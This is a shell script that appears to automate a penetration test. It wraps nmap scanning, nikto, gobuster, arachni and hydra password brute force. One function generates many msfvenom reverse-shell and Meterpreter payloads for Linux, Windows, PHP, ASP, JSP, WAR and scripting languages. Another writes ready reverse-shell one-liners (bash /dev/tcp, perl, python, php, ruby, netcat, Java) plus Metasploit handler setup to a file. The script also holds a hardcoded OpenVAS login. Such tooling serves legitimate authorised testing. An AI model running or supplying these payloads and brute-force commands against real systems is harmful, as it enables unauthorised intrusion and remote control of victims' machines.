#!/usr/bin/ksh
DATE=$(date +"%Y%m%d")
alias pbcopy='xclip -selection clipboard'
alias pbpaste='xclip -selection clipboard -o'
#######################################################################################
PROJECT="PKI"  #Projectname
infopath="/data/${PROJECT}"

##############
#my ip for reverse shells
#LOCAL_IP=$(ifconfig tap0 | grep inet | grep -v inet6 | awk '{print $2}')
LOCAL_IP=$(ifconfig eth0 | grep inet | grep -v inet6 | awk '{print $2}')
#LOCAL_IP="192.168.1.1"    

#IP targets
SCOPE1=""

#SCOPE2="$SCOPE1"
SCOPE2="$SCOPE1"

IP_LIST="$SCOPE2"   

#URL targets ip or url without http://
HTTP_LIST="$SCOPE2 $SCOPE2" 

##############
NIKTO_PORTS="80 443 5985 8002 47001"
GOB_PORTS="80 443 5985 8002 47001"
HYDRA_PORTS="21 80 443 990"
ARACHNI_PORTS="5985 8002 47001 9004"

#######################################################################################
# Todo:
#     - openvas function 
#     - nmap concurent process number...
#
#
#
#
#
#######################################################################################

[ ! -d "${infopath}" ] && { mkdir -p "${infopath}"; echo "${infopath} created"; } || { echo "${infopath} exist"; };


t_nmap() {
#set -x
    #[ ! -d "${infopath}/nmap_${DATE}/${i}" ] && { mkdir -p "${infopath}/nmap_${DATE}/${i}"; echo "${infopath}/nmap_${DATE}/${i} created"; }
NMAPCOUNTER=0
for i in $IP_LIST;do 
    if [ ! -d "${infopath}/${i}/nmap_${DATE}" ];then
         mkdir -p "${infopath}/${i}/nmap_${DATE}"; 
         echo "${infopath}/${i}/nmap_${DATE} created"; 
         echo "$i scan started..."
         echo "nmap -sS -Pn -p 1-65535 -T4 -A -v -oA ${infopath}/${i}/nmap_${DATE}/nmap_tcp_${i} ${i}" 
         #nohup nmap -sS -Pn -p 1-65535 -T4 -A -v -oA ${infopath}/${i}/nmap_${DATE}/nmap_tcp_${i} ${i} & 
         sleep 5
         NMAPCOUNTER=$(ps -ef |grep nmap | grep -v "grep" | wc -l)
         while (( $NMAPCOUNTER >= 4 ))
         do
                 sleep 4;
                 NMAPCOUNTER=$(ps -ef |grep nmap | grep -v "grep"|grep -v "grep"| wc -l);
                 if [[ -f /tmp/NMAPSTOPPER.txt ]];then
                     exit 0
                 else
                     sleep 1
                 fi
         done
    else 
         echo "$i scan started..."
         #nohup nmap -sS -Pn -p 1-65535 -T4 -A -v -oA ${infopath}/${i}/nmap_${DATE}/nmap_tcp_${i} ${i} & 
         echo "nmap -sS -Pn -p 1-65535 -T4 -A -v -oA ${infopath}/${i}/nmap_${DATE}/nmap_tcp_${i} ${i}" 
         sleep 5
         NMAPCOUNTER=$(ps -ef |grep nmap | grep -v "grep" | wc -l)             
         while (( $NMAPCOUNTER >= 4 ))
         do 
                 sleep 4; 
                 NMAPCOUNTER=$(ps -ef |grep nmap | grep -v "grep"|grep -v "grep"| wc -l);          
                 if [[ -f /tmp/NMAPSTOPPER.txt ]];then
                     exit 0
                 else
                     sleep 1
                 fi
                 
         done; 
    fi
    #echo -e -n $(cat ${infopath}/${i}/nmap_${DATE}/nmap_tcp_${i}.nmap | grep "^[0-9]" | grep open | awk -F"/" '{print $1","}' | sort -u) | sed 's/\ //g' > ${infopath}/${i}/nmap_${DATE}/nmap_tcp_${i}_port.lst
done

}

nmap_stopper() {
       touch /tmp/NMAPSTOPPER.txt
       sleep 10
       rm /tmp/NMAPSTOPPER.txt
       echo "Pease wait for NMAP stop .... (can be verry verry long)"
       NMAPCOUNTER=$(ps -ef |grep nmap | grep -v "grep"|grep -v "grep"| wc -l);
       while (( $NMAPCOUNTER > 0 ));
       do
             sleep 20
             NMAPCOUNTER=$(ps -ef |grep nmap | grep -v "grep"|grep -v "grep"| wc -l);
             echo "."
       done       
       echo "All NMAP processes stopped!"
}

u_nmap() {
NMAPCOUNTER=0
for i in $IP_LIST;do 
    if [ ! -d "${infopath}/${i}/nmap_${DATE}" ];then
         mkdir -p "${infopath}/${i}/nmap_${DATE}"; 
         echo "${infopath}/${i}/nmap_${DATE} created"; 
         echo "$i scan started..."
         nohup nmap -sU -Pn -p 49,53,67-69,80,88,111,123,135-139,161-162,443,445,497,631,996-999,1022-1023,1433-1434,7778,9200,10000 -T4 -v -oA ${infopath}/${i}/nmap_${DATE}/nmap_udp_${i} ${i} & 
         sleep 5
         NMAPCOUNTER=$(ps -ef |grep nmap | grep -v "grep" | wc -l)
         while (( $NMAPCOUNTER >= 4 ))
         do
                 sleep 4;
                 NMAPCOUNTER=$(ps -ef |grep nmap | grep -v "grep"|grep -v "grep"| wc -l);
                 if [[ -f /tmp/NMAPSTOPPER.txt ]];then
                     exit 0
                 else
                     sleep 1
                 fi
         done
    else 
         echo "$i scan started..."
         nohup nmap -sU -Pn -p 49,53,67-69,80,88,111,123,135-139,161-162,443,445,497,631,996-999,1022-1023,1433-1434,7778,9200,10000 -T4 -v -oA ${infopath}/${i}/nmap_${DATE}/nmap_udp_${i} ${i} & 
         sleep 5
         NMAPCOUNTER=$(ps -ef |grep nmap | grep -v "grep" | wc -l)             
         while (( $NMAPCOUNTER >= 4 ))
         do 
                 sleep 4; 
                 NMAPCOUNTER=$(ps -ef |grep nmap | grep -v "grep"|grep -v "grep"| wc -l);          
                 if [[ -f /tmp/NMAPSTOPPER.txt ]];then
                     exit 0
                 else
                     sleep 1
                 fi
                 
         done; 
    fi
    echo -e -n $(cat ${infopath}/${i}/nmap_${DATE}/nmap_udp_${i}.nmap | grep "^[0-9]" | grep open | awk -F"/" '{print $1","}' | sort -u) | sed 's/\ //g' > ${infopath}/${i}/nmap_${DATE}/nmap_udp_${i}_port.lst
done
}

fshgenerator() {

toolspath="${infopath}/tools"
[ ! -d "${toolspath}" ] && { mkdir -p "${toolspath}"; };
[ ! -f "${toolspath}/${LOCAL_IP}.txt" ] && { touch "${toolspath}/${LOCAL_IP}.txt"; };
LO_PORT=443
    #Linux   
    msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$LOCAL_IP LPORT=$LO_PORT -f elf > ${toolspath}/reverse_meter_${LOCAL_IP}_${LO_PORT}.elf
    msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$LOCAL_IP LPORT=$LO_PORT -f elf > ${toolspath}/reverse_meter_${LOCAL_IP}_${LO_PORT}.elf
    #Windows
    msfvenom -p windows/meterpreter/reverse_tcp LHOST=$LOCAL_IP LPORT=$LO_PORT -f exe > ${toolspath}/reverse_meter_${LOCAL_IP}_${LO_PORT}.exe
    msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=$LOCAL_IP LPORT=$LO_PORT -f exe > ${toolspath}/reverse_x64_meter_${LOCAL_IP}_${LO_PORT}.exe
    #Web Payloads
    #PHP
    msfvenom -p php/meterpreter_reverse_tcp LHOST=$LOCAL_IP LPORT=$LO_PORT -f raw > ${toolspath}/reverse_meter_${LOCAL_IP}_${LO_PORT}.php
    cat ${toolspath}/reverse_${LOCAL_IP}_${LO_PORT}.php | pbcopy && echo '<?php ' | tr -d '\n' > ${toolspath}/reverse_${LOCAL_IP}_${LO_PORT}.php && pbpaste >> ${toolspath}/reverse_${LOCAL_IP}_${LO_PORT}.php
    #ASP
    msfvenom -p windows/meterpreter/reverse_tcp LHOST=$LOCAL_IP LPORT=$LO_PORT -f asp > ${toolspath}/reverse_meter_${LOCAL_IP}_${LO_PORT}.asp
    #--------------------------------------------------------------------------------------------------------------------------------
    #No Meterpreter
    msfvenom -p linux/x86/shell/reverse_tcp LHOST=$LOCAL_IP LPORT=$LO_PORT -f elf > ${toolspath}/reverse_${LOCAL_IP}_${LO_PORT}.elf
    msfvenom -p linux/x64/shell_reverse_tcp LHOST=$LOCAL_IP LPORT=$LO_PORT -f elf > ${toolspath}/reverse_x64_${LOCAL_IP}_${LO_PORT}.elf
    msfvenom -p linux/x86/shell/reverse_tcp LHOST=$LOCAL_IP LPORT=$LO_PORT -f elf-so > ${toolspath}/reverse_${LOCAL_IP}_${LO_PORT}.so
    msfvenom -p linux/x64/shell_reverse_tcp LHOST=$LOCAL_IP LPORT=$LO_PORT -f elf-so > ${toolspath}/reverse_x64_${LOCAL_IP}_${LO_PORT}.so
    #Windows
    msfvenom -p windows/shell/reverse_tcp LHOST=$LOCAL_IP LPORT=$LO_PORT -f exe > ${toolspath}/reverse_${LOCAL_IP}_${LO_PORT}.exe
    msfvenom -p windows/x64/shell/reverse_tcp LHOST=$LOCAL_IP LPORT=$LO_PORT -f exe > ${toolspath}/reverse_x64_${LOCAL_IP}_${LO_PORT}.exe
    #Web Payloads
    #PHP
    msfvenom -p php/reverse_php LHOST=$LOCAL_IP LPORT=$LO_PORT -f raw > ${toolspath}/reverse_${LOCAL_IP}_${LO_PORT}.php
    cat ${toolspath}/reverse_${LOCAL_IP}_${LO_PORT}.php | pbcopy && echo '<?php ' | tr -d '\n' > ${toolspath}/reverse_${LOCAL_IP}_${LO_PORT}.php && pbpaste >> ${toolspath}/reverse_${LOCAL_IP}_${LO_PORT}.php
    #ASP
    msfvenom -p windows/shell/reverse_tcp LHOST=$LOCAL_IP LPORT=$LO_PORT -f asp > ${toolspath}/reverse_${LOCAL_IP}_${LO_PORT}.asp
    #---------------------------------------------------------------------------------------------------------------------------------------------
    #JSP
    msfvenom -p java/jsp_shell_reverse_tcp LHOST=$LOCAL_IP LPORT=$LO_PORT -f raw > ${toolspath}/reverse_${LOCAL_IP}_${LO_PORT}.jsp
    #WAR
    echo "msfvenom -p java/shell/reverse_tcp LHOST=$LOCAL_IP LPORT=$LO_PORT -f war > ${toolspath}/reverse_${LOCAL_IP}_${LO_PORT}.war"
    msfvenom -p java/shell/reverse_tcp LHOST=$LOCAL_IP LPORT=$LO_PORT -f war > ${toolspath}/reverse_${LOCAL_IP}_${LO_PORT}.war
    #Scripting Payloads
    #Python
    msfvenom -p cmd/unix/reverse_python LHOST=$LOCAL_IP LPORT=$LO_PORT -f raw > ${toolspath}/reverse_${LOCAL_IP}_${LO_PORT}.py
    #Bash
    msfvenom -p cmd/unix/reverse_bash LHOST=$LOCAL_IP LPORT=$LO_PORT -f raw > ${toolspath}/reverse_${LOCAL_IP}_${LO_PORT}.sh
    #Perl
    msfvenom -p cmd/unix/reverse_perl LHOST=$LOCAL_IP LPORT=$LO_PORT -f raw > ${toolspath}/reverse_${LOCAL_IP}_${LO_PORT}.pl
    #Shellcode
    
}

lshell() {

toolspath="${infopath}/tools"
[ ! -d "${toolspath}" ] && { mkdir -p ${toolspath}; };
[ ! -f ${toolspath}/lshell_${LOCAL_IP}.txt ] && { touch ${toolspath}/lshell_${LOCAL_IP}.txt; };
LO_PORT=443

    #Linux Based Shellcode
    echo "For shellcode:" >> ${toolspath}/lshell_${LOCAL_IP}.txt
    echo "Executable formats
        asp, aspx, aspx-exe, axis2, dll, elf, elf-so, exe, exe-only, exe-service, exe-small, hta-psh, jar, jsp, loop-vbs, macho, msi, msi-nouac, osx-app, psh, psh-cmd, psh-net, psh-reflection, vba, vba-exe, vba-psh, vbs, war
        Transform formats
            bash, c, csharp, dw, dword, hex, java, js_be, js_le, num, perl, pl, powershell, ps1, py, python, raw, rb, ruby, sh, vbapplication, vbscript" >> ${toolspath}/lshell_${LOCAL_IP}.txt
    echo "" >> ${toolspath}/lshell_${LOCAL_IP}.txt
    echo "msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$LOCAL_IP LPORT=$LO_PORT -f <language>" >> ${toolspath}/lshell_${LOCAL_IP}.txt
    #Windows Based Shellcode
    echo "msfvenom -p windows/meterpreter/reverse_tcp LHOST=$LOCAL_IP LPORT=$LO_PORT -f <language>" >> ${toolspath}/lshell_${LOCAL_IP}.txt
    echo "msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=$LOCAL_IP LPORT=$LO_PORT -f <language>" >> ${toolspath}/lshell_${LOCAL_IP}.txt

    echo "Metasploit handlers can be great at quickly setting up Metasploit to be in a position to receive your incoming shells. Handlers should be in the following format. \
    use exploit/multi/handler \
    set PAYLOAD <Payload name> \
    set LHOST <LHOST value> \
    set LPORT <LPORT value> \
    set ExitOnSession false \
    exploit -j -z" >> ${toolspath}/lshell_${LOCAL_IP}.txt
    
    echo "\#Bash" >> ${toolspath}/lshell_${LOCAL_IP}.txt
    echo "bash -i >& /dev/tcp/${LOCAL_IP}/443 0>&1" >> ${toolspath}/lshell_${LOCAL_IP}.txt
    echo "\#PERL" >> ${toolspath}/lshell_${LOCAL_IP}.txt
    echo "perl -e 'use Socket;\$i=\"${LOCAL_IP}\";\$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'" >> ${toolspath}/lshell_${LOCAL_IP}.txt
    echo "Python"  >> ${toolspath}/lshell_${LOCAL_IP}.txt
    echo "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"${LOCAL_IP}\",4443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);' " >> ${toolspath}/lshell_${LOCAL_IP}.txt
    echo "PHP" >> ${toolspath}/lshell_${LOCAL_IP}.txt
    echo "php -r '$sock=fsockopen(\"${LOCAL_IP}\",443);exec(\"/bin/sh -i <&3 >&3 2>&3\");' " >> ${toolspath}/lshell_${LOCAL_IP}.txt
    echo "Ruby" >> ${toolspath}/lshell_${LOCAL_IP}.txt
    echo "ruby -rsocket -e'f=TCPSocket.open(\"${LOCAL_IP}\",443).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)' " >> ${toolspath}/lshell_${LOCAL_IP}.txt
    echo "Netcat" >> ${toolspath}/lshell_${LOCAL_IP}.txt
    echo "nc -e /bin/sh ${LOCAL_IP} 443" >> ${toolspath}/lshell_${LOCAL_IP}.txt
    echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${LOCAL_IP} 443 >/tmp/f" >> ${toolspath}/lshell_${LOCAL_IP}.txt
    echo "Java" >> ${toolspath}/lshell_${LOCAL_IP}.txt
    echo "r = Runtime.getRuntime()" >> ${toolspath}/lshell_${LOCAL_IP}.txt
    echo "p = r.exec([\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/${LOCAL_IP}/443;cat <&5 | while read line; do \\\$line 2>&5 >&5; done\"] as String[])" >> ${toolspath}/lshell_${LOCAL_IP}.txt
    echo "p.waitFor()" >> ${toolspath}/lshell_${LOCAL_IP}.txt
    echo "${toolspath}/lshell_${LOCAL_IP}.txt created..."
}

fnikto() {
unset http_proxy
unset https_proxy
    for i in $HTTP_LIST; do
    ELEMNEV=$(echo "${i}" | awk '{gsub("[^a-zA-Z0-9_.]","_")}1' )
    [ ! -d ${infopath}/${ELEMNEV}/nikto_${DATE} ] && { mkdir -p ${infopath}/${ELEMNEV}/nikto_${DATE}; };
     for p in $NIKTO_PORTS; do
     case $p in
     80)
            echo "nikto -host $i -port $p -output ${infopath}/${ELEMNEV}/nikto_${DATE}/${ELEMNEV}_nikto.txt"
            nikto -host $i -port $p -output ${infopath}/${ELEMNEV}/nikto_${DATE}/${ELEMNEV}_nikto.txt
     ;;
     443)
            echo "nikto -host $i -port $p -ssl -output ${infopath}/${ELEMNEV}/nikto_${DATE}/${ELEMNEV}_nikto.txt"
            nikto -host $i -port $p -ssl -output ${infopath}/${ELEMNEV}/nikto_${DATE}/${ELEMNEV}_nikto.txt
     ;;
     *)
            echo "nikto -host $i -port $p -output ${infopath}/${ELEMNEV}/nikto_${DATE}/${ELEMNEV}_nikto.txt"
            nikto -host $i -port $p -output ${infopath}/${ELEMNEV}/nikto_${DATE}/${ELEMNEV}_nikto.txt
     ;;
     esac
     done
    done
}

fgobuster() {
unset http_proxy
unset https_proxy
    for i in $HTTP_LIST; do
    ELEMNEV=$(echo "${i}" | awk '{gsub("[^a-zA-Z0-9_.]","_")}1' )
      [ ! -d ${infopath}/${ELEMNEV}/gobuster_${DATE} ] && { mkdir -p ${infopath}/${ELEMNEV}/gobuster_${DATE}; };
      for p in $GOB_PORTS; do
              echo "gobuster -u http://${i}:$p/ -w /usr/share/seclists/Discovery/Web_Content/common.txt -s '200,204,301,302,307,403,500' -e > ${infopath}/${ELEMNEV}/gobuster_${DATE}/${ELEMNEV}_gobus.txt"
              echo "gobuster -u http://${i}:$p/ -w /usr/share/dirbuster/wordlists/directory-list-1.0.txt -s '200,204,301,302,307,403,500' -e > ${infopath}/${ELEMNEV}/gobuster_${DATE}/${ELEMNEV}_gobus.txt"
              echo "gobuster -u http://${i}:$p/ -w /usr/share/wordlists/rockyou.txt -s '200,204,301,302,307,403,500' -e > ${infopath}/${ELEMNEV}/gobuster_${DATE}/${ELEMNEV}_gobus.txt"
      done
    done
}

fhydra() {
unset http_proxy
unset https_proxy
   for i in $HTTP_LIST; do
   ELEMNEV=$( echo "${i}" | awk '{gsub("[^a-zA-Z0-9_.]","_")}1' )
       [ ! -d ${infopath}/${ELEMNEV}/hydra_${DATE} ] && { mkdir -p ${infopath}/${ELEMNEV}/hydra_${DATE}; };
       for p in $HYDRA_PORTS; do
       case $p in
   80)
       hydra -s $p http://${i} > ${infopath}/${ELEMNEV}/hydra_${DATE}/${ELEMNEV}_hydra.txt
   ;;
   443)
       hydra -s $p -S https://${i} > ${infopath}/${ELEMNEV}/hydra_${DATE}/${ELEMNEV}_hydra.txt
   ;;
   *)
       echo "###### Whithout SSL ######"
       echo "hydra -s $p https://${i} > ${infopath}/${ELEMNEV}/hydra_${DATE}/${ELEMNEV}_hydra.txt"
       echo "###### Whith SSL ######"
       echo "hydra -s $p -S https://${i} > ${infopath}/${ELEMNEV}/hydra_${DATE}/${ELEMNEV}_hydra.txt"
   ;;
   esac
                                
                echo "hydra -l user -P /usr/share/wordlists/rockyou.txt ftp://${i} "
                echo "hydra -l t@t.com -P /usr/share/wordlists/rockyou.txt ftp://${i}/"
           done
    done
}

f_arach() {
unset http_proxy
unset https_proxy
for i in $HTTP_LIST; do
   ELEMNEV=$(echo "${i}" | awk '{gsub("[^a-zA-Z0-9_.]","_")}1' )
   [ ! -d "${infopath}/${ELEMNEV}/arachni_${DATE}" ] && { mkdir -p "${infopath}/${ELEMNEV}/arachni_${DATE}"; echo "${infopath}/${ELEMNEV}/arachni_${DATE} created"; }
   for p in $ARACHNI_PORTS; do
   case $p in
       80)
          arachni --http-proxy 127.0.0.1:8888 --output-only-positives --scope-directory-depth-limit 5 --report-save-path=${infopath}/${ELEMNEV}/arachni_${DATE}/${ELEMNEV}_${p}.afr http://${i}:${p}
          arachni_reporter ${infopath}/${ELEMNEV}/${ELEMNEV}_${p}.afr --reporter=html:outfile=${infopath}/${ELEMNEV}/arachni_${DATE}/${ELEMNEV}_${p}.html.zip
       ;;
       443)
          arachni --http-proxy 127.0.0.1:8888 --output-only-positives --output-debug 4 --scope-directory-depth-limit 5 --report-save-path=${infopath}/${ELEMNEV}/arachni_${DATE}/${ELEMNEV}_${p}.afr https://${i}:${p}
          arachni_reporter ${infopath}/${ELEMNEV}/${ELEMNEV}_${p}.afr --reporter=html:outfile=${infopath}/${ELEMNEV}/arachni_${DATE}/${ELEMNEV}_${p}.html.zip
       ;;
       *)
          echo "arachni --http-proxy 127.0.0.1:8888 --output-only-positives --scope-directory-depth-limit 5 --report-save-path=${infopath}/${ELEMNEV}/arachni_${DATE}/${ELEMNEV}_${p}.afr http://${i}:${p}"
          echo "arachni_reporter ${infopath}/${ELEMNEV}/${ELEMNEV}_${p}.afr --reporter=html:outfile=${infopath}/${ELEMNEV}/arachni_${DATE}/${ELEMNEV}_${p}.html.zip"

#	  echo "arachni  http://${i}:${p} --http-proxy 127.0.0.1:8888 --report-save-path=${infopath}/${ELEMNEV}/arachni_${DATE}/${ELEMNEV}_${p}.afr --http-ssl-certificate <fullpath_and_cert_pem_file> --http-ssl-certificate-type pem --http-ssl-key <fullpath_and_key_pem_file> --http-ssl-key-type pem --http-ssl-key-password '<password>' --checks=* --scope-auto-redundant --audit-forms --audit-cookies-extensively --audit-headers --audit-json --audit-ui-forms --audit-with-extra-parameter --audit-links --output-only-positives --scope-directory-depth-limit 5 --http-cookie-string ''"
   ;;
   esac
   done
echo "##############################"
done
    
}

f_openvas() {
IP_LIST=$(echo -n $IP_LIST)|sed 's/\ /,/g'

omp -h 127.0.0.1 -p 9392 -v -u admin -w toor 

}

case "$1" in
    nmap_tcp)
        t_nmap;
    ;;
    nmap_stop)
        nmap_stopper;
    ;;
    nmap_udp)
        u_nmap;
    ;;
    generator)
            fshgenerator;
    ;;
    nikto)
        fnikto;
    ;;
    gob)
        fgobuster;
    ;;
    hyd)
        fhydra;
    ;;
    rew)
        lshell;
    ;;
    arach)
        f_arach;
    ;;
    all)    
        t_nmap;
        fshgenerator;
        fnikto;
        fgobuster;
        fhydra;
        lshell;
        u_nmap;
        f_arach;
    ;;
    *)
    echo "Usage: $SCRIPTNAME {nmap_tcp|nmap_stop|nmap_udp|generator|nikto|gob|hyd|rew|arach|all}" >&2
    ;;
esac

